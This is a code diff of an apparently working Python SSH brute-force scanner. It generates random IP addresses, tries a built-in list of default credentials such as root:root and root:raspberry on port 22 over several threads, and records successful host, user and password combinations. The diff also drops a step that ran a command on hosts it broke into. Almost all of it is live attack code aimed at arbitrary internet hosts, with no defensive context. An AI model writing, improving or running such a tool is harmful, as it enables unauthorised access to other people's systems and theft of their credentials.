@@ -15,7 +15,7 @@
 
 '''
 
-import random, paramiko, threading, os, sys, time, socket
+import random, paramiko, threading, os, sys, time
 from random import randint
 from time import sleep
 import colorama
@@ -60,8 +60,10 @@ ________________________________________________________________________________
 lucky_number = int(0)
 checks_hit = int(0)
 checks_bad = int(0)
+# default timeout for SSH client:
 default_timeout = float(5.0)
-attack_threads = int(5)
+# amount of attacking threads:
+attack_threads = int(10)
 targetips = []
 weakwords = [
     'root:root','root:toor','root:raspberry','root:test','root:uploader','root:password','root:admin',
@@ -94,7 +96,7 @@ def clean():
 
 # luckynumber() determins the amount of IP addresses to check:
 def luckynumber():
-    X = int(randint(666, 66666))
+    X = int(randint(666, 6666))
     return X
 
 # ipwriter() saves the random IPs to a file:
@@ -142,20 +144,14 @@ def countdown():
     return None
 
 # invader() is the SSH-client the bruter() will use:
-def invader(ip, user, passwd, simon_says):
+def invader(ip, user, passwd):
+    # configure SSH-client:
+    invader = paramiko.SSHClient()
+    invader.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    # try to establish a connection:
     try:
-        # configure SSH-client:
-        simon = paramiko.SSHClient()
-        simon.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        # try to establish a connection:
-        simon.connect(str(ip), int(22), str(user), str(passwd), timeout=float(default_timeout))
-        invasion_session = simon.get_transport().open_session()
-        # on active connection, send command "uname -r -v":
-        if invasion_session.active:
-            invasion_session.exec_command(str(simon_says))
-            minion_answer = str(invasion_session.recv())
-            print(Fore.LIGHTYELLOW_EX + 'TARGET: ' + str(ip) + ' tells ' + str(minion_answer) + ' ...\n')
-        simon.close()
+        invader.connect(hostname=str(ip), port=int(22), username=str(user), password=str(passwd), timeout=default_timeout)
+        invader.close()
         # in case of successful attack, tell bruter "True":
         return True
     except:
@@ -163,36 +159,39 @@ def invader(ip, user, passwd, simon_says):
 
 # bruter() attacks the targets:
 def bruter():
-    global checks_hit, checks_bad
+    global checks_hit
+    global checks_bad
+    global targetips
     # start loop:
     while len(targetips) > 0:
         try:
             # get (next) target:
-            victim = str(targetips.pop(0))
+            victim = targetips.pop(0)
             print(Fore.WHITE + 'Attacking -->> TARGET: ' + str(victim) + ' ...\n')
             # start loop to work on userpass-combolist:
             for combo in weakwords:
                 # get (next) credentials:
-                userpasswd = combo.split(':')
-                user = str(userpasswd[0])
-                passwd = str(userpasswd[1])
+                userpass = []
+                userpass = combo.split(':')
+                user = str(userpass[0])
+                passwd = str(userpass[1])
                 # try connection and auth:
-                check_result = invader(str(victim), str(user), str(passwd), str('uname -r -v'))
+                check_result = False
+                check_result = (invader(str(victim), str(user), str(passwd)))
                 # handle the result:
                 if check_result == True:
-                    hits(str(str('HOST: ') + str(victim) + ':22, USER: ' + str(user) + ', PASS: ' + str(passwd)))
+                    hits(str('HOST: ') + str(victim) + ':22, USER: ' + str(user) + ', PASS: ' + str(passwd))
                     print(Fore.LIGHTGREEN_EX + '(!) SUCCESS (!) -->> hit on TARGET: ' + str(victim) + '\n')
-                    checks_hit += 1
                     break
                 else:
                     print(Fore.LIGHTRED_EX + '(!) FAIL FOR (!) -->> ' + str(victim) + ':' + str(user) + ':'
                           + str(passwd) + ' ...\n')
                     continue
+            checks_hit += 1
         except:
             print(Fore.LIGHTRED_EX + 'Attack on target: ' + str(victim) + ' failed ...\n')
             checks_bad += 1
             continue
-    return None
 
 # <<---------------------------------------------------------------------------------------------------------------->>
 
